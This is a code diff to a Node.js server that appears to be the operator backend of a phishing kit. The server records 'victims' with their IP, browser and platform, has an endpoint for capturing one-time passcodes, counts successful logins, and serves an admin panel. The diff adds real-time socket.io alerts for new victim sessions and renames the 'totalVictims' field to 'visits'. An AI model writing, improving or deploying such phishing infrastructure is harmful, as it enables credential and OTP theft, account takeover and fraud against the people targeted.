@@ -4,6 +4,8 @@ const bodyParser = require('body-parser');
 const cors       = require('cors');
 const crypto     = require('crypto');
 const session    = require('cookie-session');
+const http       = require('http');
+const socket     = require('socket.io');
 
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
@@ -11,6 +13,8 @@ const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 
 const app  = express();
+const server = http.createServer(app);
+const io   = socket(server, { cors: { origin: '*' } });
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
@@ -29,7 +33,7 @@ const sessionActivity = new Map();   // last ping
 const auditLog        = [];          // never deleted
 let victimCounter     = 0;
 let successfulLogins  = 0;
-let currentDomain     = '';          // filled at boot + on every request
+let currentDomain     = '';
 
 const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min idle fallback
 
@@ -52,7 +56,7 @@ app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
-    return res.redirect('/panel');
+    return res.redirect('/panel?user=' + encodeURIComponent(user));
   }
   res.redirect('/panel?fail=1');
 });
@@ -110,6 +114,7 @@ function cleanupSession(sid, reason, silent = false) {
   if (!v) return;
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
+  io.emit('del', sid);
 }
 
 /* ----------  TIMEOUT CLEANER (fallback)  ---------- */
@@ -129,7 +134,7 @@ app.post('/api/session', async (req, res) => {
     const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     const ua  = req.headers['user-agent'] || 'n/a';
     const now = new Date();
-    const dateStr = now.toLocaleString(); // ISO or local – panel converts to local tz
+    const dateStr = now.toLocaleString();
 
     victimCounter++;
     const victim = {
@@ -143,6 +148,7 @@ app.post('/api/session', async (req, res) => {
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
+    io.emit('new', { sid });
     res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
@@ -233,7 +239,9 @@ app.post('/api/otp', async (req, res) => {
 /*  EXIT – victim closed page → instant delete  */
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
-  if (sid && sessionsMap.has(sid)) cleanupSession(sid, 'closed the page', true);
+  if (sid && sessionsMap.has(sid)) {
+    cleanupSession(sid, 'closed the page', true);
+  }
   res.sendStatus(200);
 });
 
@@ -268,8 +276,8 @@ app.get('/api/panel', (req, res) => {
     ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
   }));
   res.json({
-    domain: currentDomain,               // always fresh
-    totalVictims: victimCounter,
+    domain: currentDomain,
+    visits: victimCounter,               // renamed
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
@@ -309,8 +317,7 @@ app.post('/api/panel', async (req, res) => {
 });
 
 /* ----------  START  ---------- */
-app.listen(PORT, '0.0.0.0', () => {
+server.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
-  /* final fallback – overwritten on first request anyway */
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
